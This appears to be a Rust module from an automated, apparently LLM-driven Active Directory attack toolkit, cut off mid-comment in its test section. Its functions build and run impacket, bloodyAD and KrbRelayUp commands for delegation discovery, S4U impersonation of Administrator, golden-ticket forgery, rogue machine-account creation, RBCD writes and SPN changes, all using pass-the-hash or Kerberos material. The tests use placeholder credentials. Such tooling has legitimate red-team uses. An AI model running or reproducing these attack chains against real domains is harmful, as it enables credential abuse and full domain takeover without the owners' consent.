//! Kerberos delegation and domain escalation tool executors.

use anyhow::Result;
use serde_json::Value;

use crate::args::{optional_str, required_str};
use crate::credentials;
use crate::executor::CommandBuilder;
use crate::ToolOutput;

/// Find delegation configurations in the domain using impacket-findDelegation.
///
/// Required args: `domain`, `username`, `dc_ip`
/// Optional args: `password`, `hash` (at least one required)
pub async fn find_delegation(args: &Value) -> Result<ToolOutput> {
    let domain = required_str(args, "domain")?;
    let username = required_str(args, "username")?;
    let password = optional_str(args, "password");
    let hash = optional_str(args, "hash");
    let dc_ip = required_str(args, "dc_ip")?;

    let mut cmd = CommandBuilder::new("impacket-findDelegation");

    if let Some(h) = hash {
        cmd = cmd
            .arg(format!("{domain}/{username}"))
            .args(credentials::hash_args(h));
    } else if let Some(p) = password {
        cmd = cmd.arg(format!("{domain}/{username}:{p}"));
    } else {
        anyhow::bail!("find_delegation requires either password or hash");
    }

    cmd.flag("-dc-ip", dc_ip).timeout_secs(120).execute().await
}

/// Perform an S4U (constrained delegation) attack to obtain a service ticket.
///
/// Required args: `domain`, `username`, `target_spn`, `impersonate`
/// Optional args: `password`, `hash`, `aes_key`, `dc_ip`
pub async fn s4u_attack(args: &Value) -> Result<ToolOutput> {
    build_s4u_command(args)?.execute().await
}

/// Build the `impacket-getST` command for an S4U attack.
///
/// Split out from [`s4u_attack`] so unit tests can assert on the constructed
/// argument vector (via `args_for_test`) without spawning the binary.
///
/// getST.py expects `domain/user:pass` or `domain/user -hashes :hash` — no
/// `@target` suffix (unlike secretsdump/wmiexec); the DC is specified via
/// `-dc-ip` instead. When an AES256 key is available it is passed via
/// `-aesKey` so getST requests AES-etype tickets. Without it, impacket
/// authenticates RC4-only through `-hashes` and an AES-only delegating
/// account (or a hardened DC with RC4 disabled) rejects the S4U TGS with
/// `KDC_ERR_ETYPE_NOSUPP`.
#[doc(hidden)]
pub fn build_s4u_command(args: &Value) -> Result<CommandBuilder> {
    let domain = required_str(args, "domain")?;
    let username = required_str(args, "username")?;
    // Treat empty-string secrets as "not provided" — impacket-getST would
    // otherwise prompt interactively and the task would time out.
    let password = optional_str(args, "password").filter(|s| !s.is_empty());
    let hash = optional_str(args, "hash").filter(|s| !s.is_empty());
    let aes_key = optional_str(args, "aes_key").filter(|s| !s.is_empty());
    let target_spn = required_str(args, "target_spn")?;
    let impersonate = required_str(args, "impersonate")?;
    let dc_ip = optional_str(args, "dc_ip");

    let mut cmd = CommandBuilder::new("impacket-getST")
        .flag("-spn", target_spn)
        .flag("-impersonate", impersonate);

    if let Some(h) = hash {
        cmd = cmd
            .arg(format!("{domain}/{username}"))
            .args(credentials::hash_args(h));
    } else if let Some(p) = password {
        cmd = cmd.arg(format!("{domain}/{username}:{p}"));
    } else if aes_key.is_some() {
        // AES-only authenticator: secretsdump yielded an AES key but no usable
        // NT hash/password. getST derives the TGT from `-aesKey` alone, so the
        // positional identity carries no secret.
        cmd = cmd.arg(format!("{domain}/{username}"));
    } else {
        anyhow::bail!("s4u_attack requires a non-empty password, hash, or aes_key — got none");
    }

    // Supply the AES256 key so getST negotiates AES etypes. This is the fix
    // for `KDC_ERR_ETYPE_NOSUPP` on accounts/DCs where RC4 is disabled.
    if let Some(aes) = aes_key {
        cmd = cmd.flag("-aesKey", aes);
    }

    Ok(cmd.timeout_secs(120).flag_opt("-dc-ip", dc_ip))
}

/// Generate a Kerberos golden ticket using impacket-ticketer.
///
/// Required args: `krbtgt_hash`, `domain_sid`, `domain`
/// Optional args: `extra_sid`, `username`
pub async fn generate_golden_ticket(args: &Value) -> Result<ToolOutput> {
    let krbtgt_hash = required_str(args, "krbtgt_hash")?;
    let domain_sid = required_str(args, "domain_sid")?;
    let domain = required_str(args, "domain")?;
    let extra_sid = optional_str(args, "extra_sid");
    let username = optional_str(args, "username").unwrap_or("Administrator");
    // -nthash expects a 32-char NT hash; strip any LM half if the LLM
    // passed a `LM:NT` concatenated form.
    let nt = credentials::nt_hash_only(krbtgt_hash);

    CommandBuilder::new("impacket-ticketer")
        .flag("-nthash", nt)
        .flag("-domain-sid", domain_sid)
        .flag("-domain", domain)
        .flag_opt("-extra-sid", extra_sid)
        .flag("-user-id", "500")
        .arg(username)
        .timeout_secs(120)
        .execute()
        .await
}

/// Apply the shared auth precedence to an impacket command whose identity is a
/// bare `domain/username[:password]` string with no `@target` suffix
/// (`addcomputer`, `rbcd` — unlike `secretsdump`/`wmiexec`, which append the
/// host and are served by [`credentials::impacket_target`]).
///
/// Precedence: `ticket_path` > NTLM hash (`hash`/`nt_hash`/`ntlm_hash`) >
/// `password`. The identity carries `:password` ONLY on the password branch —
/// appending it under hash or ccache auth makes impacket prefer the cleartext
/// bind and discard the pass-the-hash/Kerberos material entirely.
fn impacket_identity_auth(
    cmd: CommandBuilder,
    args: &Value,
    domain: &str,
    username: &str,
) -> Result<CommandBuilder> {
    let identity = format!("{domain}/{username}");

    if let Some(tpath) = optional_str(args, "ticket_path").filter(|s| !s.is_empty()) {
        let (ccname_key, ccname_val) = credentials::kerberos_env(tpath);
        let (cfg_key, cfg_val) = credentials::krb5_config_env(tpath);
        return Ok(cmd
            .arg(identity)
            .arg("-k")
            .arg("-no-pass")
            .env(ccname_key, ccname_val)
            .env(cfg_key, cfg_val));
    }

    if let Some(raw) = credentials::ntlm_hash_arg(args) {
        return Ok(cmd
            .arg(identity)
            .args(credentials::hash_args(&credentials::lm_nt_hash_pair(raw)?))
            .arg("-no-pass"));
    }

    let password = optional_str(args, "password")
        .filter(|s| !s.is_empty())
        .ok_or_else(|| anyhow::anyhow!("{}", credentials::NO_AUTH_MATERIAL))?;
    Ok(cmd.arg(format!("{identity}:{password}")))
}

/// Add a computer account to the domain using impacket-addcomputer.
///
/// Required args: `domain`, `username`, `computer_name`, `dc_ip`
/// (`computer_password` required only for the default add action).
/// Auth — one of (precedence: `ticket_path` > `hash` > `password`), see
/// [`impacket_identity_auth`]:
///   - `ticket_path` — Kerberos ccache (`-k -no-pass` + `KRB5CCNAME`); also
///     needs `dc_host`, since addcomputer.py raises "Kerberos auth requires
///     DNS name of the target DC. Use -dc-host." before it ever connects
///   - `hash`/`nt_hash`/`ntlm_hash` — NTLM pass-the-hash (`-hashes LM:NT`)
///   - `password` — plaintext, folded into the identity string
///
/// Optional args: `action` (`add` [default] | `delete`), `dc_host`. `delete`
///                removes the named computer — used by operation teardown to
///                drop a machine account this op created.
pub async fn add_computer(args: &Value) -> Result<ToolOutput> {
    build_add_computer(args)?.execute().await
}

/// Build the `impacket-addcomputer` command.
///
/// Split out from [`add_computer`] so unit tests can assert on the constructed
/// argument vector (via `args_for_test`) without spawning the binary.
#[doc(hidden)]
pub fn build_add_computer(args: &Value) -> Result<CommandBuilder> {
    let domain = required_str(args, "domain")?;
    let username = required_str(args, "username")?;
    let computer_name = required_str(args, "computer_name")?;
    let dc_ip = required_str(args, "dc_ip")?;
    let action = optional_str(args, "action").unwrap_or("add");
    let dc_host = optional_str(args, "dc_host").filter(|s| !s.is_empty());

    if optional_str(args, "ticket_path").is_some_and(|s| !s.is_empty()) && dc_host.is_none() {
        anyhow::bail!(
            "add_computer with a Kerberos ccache also needs `dc_host` (the DC's DNS \
             name) — impacket-addcomputer rejects `-k` without `-dc-host`"
        );
    }

    let mut cmd = impacket_identity_auth(
        CommandBuilder::new("impacket-addcomputer"),
        args,
        domain,
        username,
    )?
    .flag("-computer-name", computer_name)
    .flag("-dc-ip", dc_ip)
    .flag_opt("-dc-host", dc_host);

    if matches!(action, "delete" | "del" | "remove") {
        cmd = cmd.arg("-delete");
    } else {
        cmd = cmd.flag("-computer-pass", required_str(args, "computer_password")?);
    }
    Ok(cmd.timeout_secs(120))
}

/// Add or remove an SPN on a target account using bloodyAD.
///
/// Required args: `domain`, `dc_ip`, `action`, `target_account`, `spn`
/// Auth — one of (precedence: `ticket_path` > `hash` > `password`), see
/// [`credentials::bloodyad_base`]:
///   - `ticket_path` (Kerberos ccache; bloodyAD `-k ccache=<path>`)
///   - `username` + `hash`/`nt_hash`/`ntlm_hash` (NTLM pass-the-hash)
///   - `username` + `password` (plaintext NTLM bind)
pub async fn addspn(args: &Value) -> Result<ToolOutput> {
    build_addspn(args)?.execute().await
}

/// Build the `bloodyAD … spn` command.
///
/// Split out from [`addspn`] so unit tests can assert on the constructed
/// argument vector (via `args_for_test`) without spawning the binary.
#[doc(hidden)]
pub fn build_addspn(args: &Value) -> Result<CommandBuilder> {
    let domain = required_str(args, "domain")?;
    let dc_ip = required_str(args, "dc_ip")?;
    let action = required_str(args, "action")?;
    let target_account = required_str(args, "target_account")?;
    let spn = required_str(args, "spn")?;

    Ok(credentials::bloodyad_base(args, domain, dc_ip)?
        .arg(action)
        .arg("spn")
        .arg(target_account)
        .arg(spn)
        .timeout_secs(120))
}

/// Write Resource-Based Constrained Delegation (RBCD) via impacket-rbcd.
///
/// Required args: `domain`, `username`, `target_computer`, `attacker_sid`,
///                `dc_ip`
/// Auth — one of (precedence: `ticket_path` > `hash` > `password`), see
/// [`impacket_identity_auth`]:
///   - `ticket_path` — Kerberos ccache (`-k -no-pass` + `KRB5CCNAME`)
///   - `hash`/`nt_hash`/`ntlm_hash` — NTLM pass-the-hash (`-hashes LM:NT`)
///   - `password` — plaintext, folded into the identity string
///
/// Optional args: `dc_host`. rbcd.py resolves the LDAP target from `-dc-host`
/// when set and otherwise falls back to an anonymous SMB lookup of the DC's
/// machine name, which a hardened DC refuses.
pub async fn rbcd_write(args: &Value) -> Result<ToolOutput> {
    build_rbcd_write(args)?.execute().await
}

/// Build the `impacket-rbcd` command.
///
/// Split out from [`rbcd_write`] so unit tests can assert on the constructed
/// argument vector (via `args_for_test`) without spawning the binary.
#[doc(hidden)]
pub fn build_rbcd_write(args: &Value) -> Result<CommandBuilder> {
    let domain = required_str(args, "domain")?;
    let username = required_str(args, "username")?;
    let target_computer = required_str(args, "target_computer")?;
    let attacker_sid = required_str(args, "attacker_sid")?;
    let dc_ip = required_str(args, "dc_ip")?;
    let dc_host = optional_str(args, "dc_host").filter(|s| !s.is_empty());

    let cmd = CommandBuilder::new("impacket-rbcd")
        .flag("-delegate-to", target_computer)
        .flag("-delegate-from", attacker_sid)
        .flag("-action", "write")
        .flag("-dc-ip", dc_ip)
        .flag_opt("-dc-host", dc_host);

    Ok(impacket_identity_auth(cmd, args, domain, username)?.timeout_secs(120))
}

/// Run KrbRelayUp for local privilege escalation via Kerberos relay.
///
/// Required args: `domain`, `dc_ip`
/// Optional args: `method`, `create_user`, `create_password`
pub async fn krbrelayup(args: &Value) -> Result<ToolOutput> {
    let domain = required_str(args, "domain")?;
    let dc_ip = required_str(args, "dc_ip")?;
    let method = optional_str(args, "method");
    let create_user = optional_str(args, "create_user");
    let create_password = optional_str(args, "create_password");

    CommandBuilder::new("KrbRelayUp")
        .arg("relay")
        .flag("-d", domain)
        .flag("-dc", dc_ip)
        .flag_opt("-m", method)
        .flag_opt("-cls", create_user)
        .flag_opt("-cp", create_password)
        .timeout_secs(120)
        .execute()
        .await
}

#[cfg(test)]
mod tests {
    use crate::args::{optional_str, required_str};
    use crate::credentials;
    use serde_json::json;

    #[test]
    fn find_delegation_requires_domain() {
        let args = json!({
            "username": "admin",
            "dc_ip": "192.168.58.10",
            "password": "P@ssw0rd!"
        });
        assert!(required_str(&args, "domain").is_err());
    }

    #[test]
    fn find_delegation_requires_username() {
        let args = json!({
            "domain": "contoso.local",
            "dc_ip": "192.168.58.10",
            "password": "P@ssw0rd!"
        });
        assert!(required_str(&args, "username").is_err());
    }

    #[test]
    fn find_delegation_requires_dc_ip() {
        let args = json!({
            "domain": "contoso.local",
            "username": "admin",
            "password": "P@ssw0rd!"
        });
        assert!(required_str(&args, "dc_ip").is_err());
    }

    #[test]
    fn find_delegation_with_password() {
        let args = json!({
            "domain": "contoso.local",
            "username": "admin",
            "password": "P@ssw0rd!",
            "dc_ip": "192.168.58.10"
        });
        let domain = required_str(&args, "domain").unwrap();
        let username = required_str(&args, "username").unwrap();
        let password = optional_str(&args, "password");
        assert_eq!(domain, "contoso.local");
        assert_eq!(username, "admin");
        assert_eq!(password, Some("P@ssw0rd!"));
    }

    #[test]
    fn find_delegation_with_hash() {
        let args = json!({
            "domain": "contoso.local",
            "username": "admin",
            "hash": "aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0",
            "dc_ip": "192.168.58.10"
        });
        let hash = optional_str(&args, "hash").unwrap();
        let hash_args = credentials::hash_args(hash);
        assert_eq!(hash_args[0], "-hashes");
        // Hash already has colon, should be passed as-is
        assert!(hash_args[1].contains(':'));
    }

    #[test]
    fn find_delegation_requires_password_or_hash() {
        let args = json!({
            "domain": "contoso.local",
            "username": "admin",
            "dc_ip": "192.168.58.10"
        });
        let password = optional_str(&args, "password");
        let hash = optional_str(&args, "hash");
        assert!(password.is_none());
        assert!(hash.is_none());
    }

    #[test]
    fn find_delegation_no_auth_errors() {
        let args = json!({
            "domain": "contoso.local",
            "username": "admin",
            "dc_ip": "192.168.58.10"
        });
        let rt = tokio::runtime::Runtime::new().unwrap();
        let result = rt.block_on(super::find_delegation(&args));
        // Should bail with "requires either password or hash"
        assert!(result.is_err());
        assert!(result.unwrap_err().to_string().contains("password or hash"));
    }

    #[test]
    fn s4u_attack_requires_target_spn() {
        let args = json!({
            "domain": "contoso.local",
            "username": "svc_web$",
            "password": "P@ssw0rd!",
            "impersonate": "Administrator"
        });
        assert!(required_str(&args, "target_spn").is_err());
    }

    #[test]
    fn s4u_attack_requires_impersonate() {
        let args = json!({
            "domain": "contoso.local",
            "username": "svc_web$",
            "password": "P@ssw0rd!",
            "target_spn": "cifs/dc01.contoso.local"
        });
        assert!(required_str(&args, "impersonate").is_err());
    }

    #[test]
    fn s4u_attack_all_args() {
        let args = json!({
            "domain": "contoso.local",
            "username": "svc_web$",
            "password": "P@ssw0rd!",
            "target_spn": "cifs/dc01.contoso.local",
            "impersonate": "Administrator",
            "dc_ip": "192.168.58.10"
        });
        assert_eq!(required_str(&args, "domain").unwrap(), "contoso.local");
        assert_eq!(
            required_str(&args, "target_spn").unwrap(),
            "cifs/dc01.contoso.local"
        );
        assert_eq!(required_str(&args, "impersonate").unwrap(), "Administrator");
        assert_eq!(optional_str(&args, "dc_ip"), Some("192.168.58.10"));
    }

    #[test]
    fn s4u_attack_no_auth_errors() {
        let args = json!({
            "domain": "contoso.local",
            "username": "svc_web$",
            "target_spn": "cifs/dc01.contoso.local",
            "impersonate": "Administrator"
        });
        let rt = tokio::runtime::Runtime::new().unwrap();
        let result = rt.block_on(super::s4u_attack(&args));
        assert!(result.is_err());
        assert!(result
            .unwrap_err()
            .to_string()
            .contains("password, hash, or aes_key"));
    }

    #[test]
    fn s4u_attack_empty_password_and_hash_errors() {
        // Regression: an empty password/hash string must be rejected as if
        // absent — impacket-getST would otherwise prompt interactively and
        // the task would time out.
        let args = json!({
            "domain": "contoso.local",
            "username": "svc_web$",
            "password": "",
            "hash": "",
            "target_spn": "cifs/dc01.contoso.local",
            "impersonate": "Administrator"
        });
        let rt = tokio::runtime::Runtime::new().unwrap();
        let result = rt.block_on(super::s4u_attack(&args));
        assert!(result.is_err());
        assert!(result
            .unwrap_err()
            .to_string()
            .contains("password, hash, or aes_key"));
    }

    #[test]
    fn s4u_attack_passes_aes_key_alongside_hash() {
        // secretsdump yields both the NT hash and the AES256 key for a machine
        // account. Both must reach getST: `-hashes` for the identity and
        // `-aesKey` so the TGS is requested with an AES etype — without the
        // latter, an RC4-disabled DC returns KDC_ERR_ETYPE_NOSUPP.
        let aes = "a".repeat(64);
        let args = json!({
            "domain": "contoso.local",
            "username": "svc_web$",
            "hash": "aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0",
            "aes_key": aes,
            "target_spn": "cifs/dc01.contoso.local",
            "impersonate": "Administrator",
            "dc_ip": "192.168.58.10"
        });
        let cmd = super::build_s4u_command(&args).unwrap();
        let a = cmd.args_for_test();
        assert!(
            a.iter().any(|x| x == "-aesKey"),
            "expected -aesKey flag: {a:?}"
        );
        assert!(
            a.iter().any(|x| x == &aes),
            "expected the AES key value: {a:?}"
        );
        assert!(
            a.iter().any(|x| x == "-hashes"),
            "hash auth must still be present: {a:?}"
        );
    }

    #[test]
    fn s4u_attack_aes_key_only_authenticates() {
        // AES key present, no NT hash/password — getST derives the TGT from
        // `-aesKey` alone, so the positional identity carries no secret and the
        // wrapper must not bail.
        let aes = "b".repeat(64);
        let args = json!({
            "domain": "contoso.local",
            "username": "svc_web$",
            "aes_key": aes,
            "target_spn": "cifs/dc01.contoso.local",
            "impersonate": "Administrator"
        });
        let cmd = super::build_s4u_command(&args).unwrap();
        let a = cmd.args_for_test();
        assert!(
            a.iter().any(|x| x == "-aesKey"),
            "expected -aesKey flag: {a:?}"
        );
        assert!(
            a.iter().any(|x| x == "contoso.local/svc_web$"),
            "identity must be the bare domain/user with no secret: {a:?}"
        );
        assert!(
            a.iter().all(|x| x != "-hashes"),
            "no -hashes when only AES is available: {a:?}"
        );
    }

    #[test]
    fn s4u_attack_omits_aes_key_flag_when_absent() {
        // Password auth with no AES key — `-aesKey` must not appear so getST
        // keeps its default etype negotiation.
        let args = json!({
            "domain": "contoso.local",
            "username": "svc_web$",
            "password": "P@ssw0rd!",
            "target_spn": "cifs/dc01.contoso.local",
            "impersonate": "Administrator"
        });
        let cmd = super::build_s4u_command(&args).unwrap();
        let a = cmd.args_for_test();
        assert!(
            a.iter().all(|x| x != "-aesKey"),
            "no -aesKey without an AES key: {a:?}"
        );
    }

    #[test]
    fn golden_ticket_requires_krbtgt_hash() {
        let args = json!({
            "domain_sid": "S-1-5-21-1234567890-987654321-1122334455",
            "domain": "contoso.local"
        });
        assert!(required_str(&args, "krbtgt_hash").is_err());
    }

    #[test]
    fn golden_ticket_requires_domain_sid() {
        let args = json!({
            "krbtgt_hash": "31d6cfe0d16ae931b73c59d7e0c089c0",
            "domain": "contoso.local"
        });
        assert!(required_str(&args, "domain_sid").is_err());
    }

    #[test]
    fn golden_ticket_default_username() {
        let args = json!({
            "krbtgt_hash": "31d6cfe0d16ae931b73c59d7e0c089c0",
            "domain_sid": "S-1-5-21-1234567890-987654321-1122334455",
            "domain": "contoso.local"
        });
        let username = optional_str(&args, "username").unwrap_or("Administrator");
        assert_eq!(username, "Administrator");
    }

    #[test]
    fn golden_ticket_custom_username() {
        let args = json!({
            "krbtgt_hash": "31d6cfe0d16ae931b73c59d7e0c089c0",
            "domain_sid": "S-1-5-21-1234567890-987654321-1122334455",
            "domain": "contoso.local",
            "username": "fakeadmin"
        });
        let username = optional_str(&args, "username").unwrap_or("Administrator");
        assert_eq!(username, "fakeadmin");
    }

    #[test]
    fn golden_ticket_extra_sid_optional() {
        let args = json!({
            "krbtgt_hash": "31d6cfe0d16ae931b73c59d7e0c089c0",
            "domain_sid": "S-1-5-21-1234567890-987654321-1122334455",
            "domain": "contoso.local",
            "extra_sid": "S-1-5-21-0000000000-000000000-000000000-519"
        });
        assert_eq!(
            optional_str(&args, "extra_sid"),
            Some("S-1-5-21-0000000000-000000000-000000000-519")
        );
    }

    #[test]
    fn golden_ticket_extra_sid_absent() {
        let args = json!({
            "krbtgt_hash": "31d6cfe0d16ae931b73c59d7e0c089c0",
            "domain_sid": "S-1-5-21-1234567890-987654321-1122334455",
            "domain": "contoso.local"
        });
        assert!(optional_str(&args, "extra_sid").is_none());
    }

    #[test]
    fn add_computer_all_required_args() {
        let args = json!({
            "domain": "contoso.local",
            "username": "alice",
            "password": "P@ssw0rd!",
            "computer_name": "svc_rbcd$",
            "computer_password": "CompP@ss123!",
            "dc_ip": "192.168.58.10"
        });
        let cmd = super::build_add_computer(&args).unwrap();
        let argv = cmd.args_for_test();
        assert!(argv.iter().any(|a| a == "contoso.local/alice:P@ssw0rd!"));
        assert_eq!(flag_value(argv, "-computer-name"), Some("svc_rbcd$"));
        assert_eq!(flag_value(argv, "-computer-pass"), Some("CompP@ss123!"));
        assert_eq!(flag_value(argv, "-dc-ip"), Some("192.168.58.10"));
    }

    #[test]
    fn add_computer_missing_computer_name() {
        let args = json!({
            "domain": "contoso.local",
            "username": "jsmith",
            "password": "P@ssw0rd!",
            "computer_password": "CompP@ss123!",
            "dc_ip": "192.168.58.10"
        });
        assert!(required_str(&args, "computer_name").is_err());
    }

    #[test]
    fn addspn_all_required_args() {
        let args = json!({
            "domain": "contoso.local",
            "username": "admin",
            "password": "P@ssw0rd!",
            "dc_ip": "192.168.58.10",
            "action": "add",
            "target_account": "svc_sql",
            "spn": "MSSQLSvc/sql01.contoso.local:1433"
        });
        let cmd = super::build_addspn(&args).unwrap();
        let argv = cmd.args_for_test();
        assert_eq!(flag_value(argv, "-p"), Some("P@ssw0rd!"));
        assert_eq!(flag_value(argv, "--host"), Some("192.168.58.10"));
        assert!(argv.iter().any(|a| a == "add"));
        assert!(argv.iter().any(|a| a == "spn"));
        assert!(argv.iter().any(|a| a == "svc_sql"));
        assert!(argv
            .iter()
            .any(|a| a == "MSSQLSvc/sql01.contoso.local:1433"));
    }

    #[test]
    fn addspn_missing_spn() {
        let args = json!({
            "domain": "contoso.local",
            "username": "admin",
            "password": "P@ssw0rd!",
            "dc_ip": "192.168.58.10",
            "action": "add",
            "target_account": "svc_sql"
        });
        assert!(required_str(&args, "spn").is_err());
    }

    #[test]
    fn rbcd_write_all_args() {
        let args = json!({
            "domain": "contoso.local",
            "username": "admin",
            "password": "P@ssw0rd!",
            "target_computer": "dc01$",
            "attacker_sid": "S-1-5-21-1234567890-987654321-1122334455-1234",
            "dc_ip": "192.168.58.10"
        });
        let cmd = super::build_rbcd_write(&args).unwrap();
        let argv = cmd.args_for_test();
        assert!(argv.iter().any(|a| a == "contoso.local/admin:P@ssw0rd!"));
        assert_eq!(flag_value(argv, "-delegate-to"), Some("dc01$"));
        assert_eq!(
            flag_value(argv, "-delegate-from"),
            Some("S-1-5-21-1234567890-987654321-1122334455-1234")
        );
        assert_eq!(flag_value(argv, "-action"), Some("write"));
    }

    #[test]
    fn rbcd_write_missing_attacker_sid() {
        let args = json!({
            "domain": "contoso.local",
            "username": "admin",
            "password": "P@ssw0rd!",
            "target_computer": "dc01$",
            "dc_ip": "192.168.58.10"
        });
        assert!(required_str(&args, "attacker_sid").is_err());
    }

    #[test]
    fn krbrelayup_required_args_only() {
        let args = json!({
            "domain": "contoso.local",
            "dc_ip": "192.168.58.10"
        });
        assert_eq!(required_str(&args, "domain").unwrap(), "contoso.local");
        assert_eq!(required_str(&args, "dc_ip").unwrap(), "192.168.58.10");
        assert!(optional_str(&args, "method").is_none());
        assert!(optional_str(&args, "create_user").is_none());
        assert!(optional_str(&args, "create_password").is_none());
    }

    #[test]
    fn krbrelayup_with_optional_args() {
        let args = json!({
            "domain": "contoso.local",
            "dc_ip": "192.168.58.10",
            "method": "rbcd",
            "create_user": "eviluser",
            "create_password": "Ev1lP@ss!"
        });
        assert_eq!(optional_str(&args, "method"), Some("rbcd"));
        assert_eq!(optional_str(&args, "create_user"), Some("eviluser"));
    }

    #[test]
    fn hash_args_with_nt_only() {
        let hash_args = credentials::hash_args("31d6cfe0d16ae931b73c59d7e0c089c0");
        assert_eq!(hash_args[0], "-hashes");
        assert_eq!(hash_args[1], ":31d6cfe0d16ae931b73c59d7e0c089c0");
    }

    #[test]
    fn hash_args_with_lm_nt() {
        let hash_args = credentials::hash_args(
            "aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0",
        );
        assert_eq!(hash_args[0], "-hashes");
        assert_eq!(
            hash_args[1],
            "aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0"
        );
    }

    #[test]
    fn impacket_auth_with_hash() {
        let (target, extra) = credentials::impacket_auth(
            Some("contoso.local"),
            "admin",
            None,
            Some("31d6cfe0d16ae931b73c59d7e0c089c0"),
            "192.168.58.10",
        );
        assert_eq!(target, "contoso.local/admin@192.168.58.10");
        assert_eq!(extra, vec!["-hashes", ":31d6cfe0d16ae931b73c59d7e0c089c0"]);
    }

    #[test]
    fn impacket_auth_with_password() {
        let (target, extra) = credentials::impacket_auth(
            Some("contoso.local"),
            "admin",
            Some("P@ssw0rd!"),
            None,
            "192.168.58.10",
        );
        assert_eq!(target, "contoso.local/admin:P@ssw0rd!@192.168.58.10");
        assert!(extra.is_empty());
    }

    #[test]
    fn kerberos_env() {
        let (key, val) = credentials::kerberos_env("/tmp/admin.ccache");
        assert_eq!(key, "KRB5CCNAME");
        assert_eq!(val, "/tmp/admin.ccache");
    }

    // --- mock executor tests ---

    use super::*;
    use crate::executor::mock;

    #[tokio::test]
    async fn find_delegation_with_password_executes() {
        mock::push(mock::success());
        let args = json!({
            "domain": "contoso.local",
            "username": "admin",
            "password": "P@ssw0rd!",
            "dc_ip": "192.168.58.10"
        });
        assert!(find_delegation(&args).await.is_ok());
    }

    #[tokio::test]
    async fn find_delegation_with_hash_executes() {
        mock::push(mock::success());
        let args = json!({
            "domain": "contoso.local",
            "username": "admin",
            "hash": "aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0",
            "dc_ip": "192.168.58.10"
        });
        assert!(find_delegation(&args).await.is_ok());
    }

    #[tokio::test]
    async fn s4u_attack_with_password_executes() {
        mock::push(mock::success());
        let args = json!({
            "domain": "contoso.local",
            "username": "svc_web$",
            "password": "P@ssw0rd!",
            "target_spn": "cifs/dc01.contoso.local",
            "impersonate": "Administrator"
        });
        assert!(s4u_attack(&args).await.is_ok());
    }

    #[tokio::test]
    async fn s4u_attack_with_hash_and_dc_ip_executes() {
        mock::push(mock::success());
        let args = json!({
            "domain": "contoso.local",
            "username": "svc_web$",
            "hash": "31d6cfe0d16ae931b73c59d7e0c089c0",
            "target_spn": "cifs/dc01.contoso.local",
            "impersonate": "Administrator",
            "dc_ip": "192.168.58.10"
        });
        assert!(s4u_attack(&args).await.is_ok());
    }

    #[tokio::test]
    async fn generate_golden_ticket_executes() {
        mock::push(mock::success());
        let args = json!({
            "krbtgt_hash": "31d6cfe0d16ae931b73c59d7e0c089c0",
            "domain_sid": "S-1-5-21-1234567890-987654321-1122334455",
            "domain": "contoso.local"
        });
        assert!(generate_golden_ticket(&args).await.is_ok());
    }

    #[tokio::test]
    async fn generate_golden_ticket_with_extra_sid_executes() {
        mock::push(mock::success());
        let args = json!({
            "krbtgt_hash": "31d6cfe0d16ae931b73c59d7e0c089c0",
            "domain_sid": "S-1-5-21-1234567890-987654321-1122334455",
            "domain": "contoso.local",
            "extra_sid": "S-1-5-21-0000000000-000000000-000000000-519",
            "username": "fakeadmin"
        });
        assert!(generate_golden_ticket(&args).await.is_ok());
    }

    #[tokio::test]
    async fn add_computer_executes() {
        mock::push(mock::success());
        let args = json!({
            "domain": "contoso.local",
            "username": "jsmith",
            "password": "P@ssw0rd!",
            "computer_name": "EVIL$",
            "computer_password": "CompP@ss123!",
            "dc_ip": "192.168.58.10"
        });
        assert!(add_computer(&args).await.is_ok());
    }

    #[tokio::test]
    async fn addspn_executes() {
        mock::push(mock::success());
        let args = json!({
            "domain": "contoso.local",
            "username": "admin",
            "password": "P@ssw0rd!",
            "dc_ip": "192.168.58.10",
            "action": "add",
            "target_account": "svc_sql",
            "spn": "MSSQLSvc/sql01.contoso.local:1433"
        });
        assert!(addspn(&args).await.is_ok());
    }

    #[tokio::test]
    async fn rbcd_write_executes() {
        mock::push(mock::success());
        let args = json!({
            "domain": "contoso.local",
            "username": "admin",
            "password": "P@ssw0rd!",
            "target_computer": "dc01$",
            "attacker_sid": "S-1-5-21-1234567890-987654321-1122334455-1234",
            "dc_ip": "192.168.58.10"
        });
        assert!(rbcd_write(&args).await.is_ok());
    }

    #[tokio::test]
    async fn krbrelayup_executes() {
        mock::push(mock::success());
        let args = json!({
            "domain": "contoso.local",
            "dc_ip": "192.168.58.10"
        });
        assert!(krbrelayup(&args).await.is_ok());
    }

    #[tokio::test]
    async fn krbrelayup_with_options_executes() {
        mock::push(mock::success());
        let args = json!({
            "domain": "contoso.local",
            "dc_ip": "192.168.58.10",
            "method": "rbcd",
            "create_user": "eviluser",
            "create_password": "Ev1lP@ss!"
        });
        assert!(krbrelayup(&args).await.is_ok());
    }

    // ── hash / ticket auth for the GenericAll→RBCD chain ────────────────

    const NT: &str = "0123456789abcdef0123456789abcdef";
    const LM: &str = "fedcba9876543210fedcba9876543210";
    const EMPTY_LM: &str = "aad3b435b51404eeaad3b435b51404ee";
    const CCACHE: &str = "/tmp/ares-tickets/alice.ccache";

    /// Value that follows `flag` in the built argv, if present.
    fn flag_value<'a>(argv: &'a [String], flag: &str) -> Option<&'a str> {
        let idx = argv.iter().position(|a| a == flag)?;
        argv.get(idx + 1).map(String::as_str)
    }

    fn with_arg(base: &Value, key: &str, value: &str) -> Value {
        let mut args = base.clone();
        args.as_object_mut()
            .unwrap()
            .insert(key.to_string(), Value::String(value.to_string()));
        args
    }

    fn add_computer_base() -> Value {
        json!({
            "domain": "contoso.local",
            "username": "alice",
            "computer_name": "svc_rbcd$",
            "computer_password": "CompP@ss123!",
            "dc_ip": "192.168.58.10"
        })
    }

    fn rbcd_write_base() -> Value {
        json!({
            "domain": "contoso.local",
            "username": "alice",
            "target_computer": "dc01$",
            "attacker_sid": "S-1-5-21-1234567890-987654321-1122334455-1234",
            "dc_ip": "192.168.58.10"
        })
    }

    fn addspn_base() -> Value {
        json!({
            "domain": "contoso.local",
            "username": "alice",
            "dc_ip": "192.168.58.10",
            "action": "add",
            "target_account": "svc_sql",
            "spn": "MSSQLSvc/sql01.contoso.local:1433"
        })
    }

    type Builder = fn(&Value) -> Result<CommandBuilder>;

    /// The impacket-backed chain steps, whose identity string is a bare
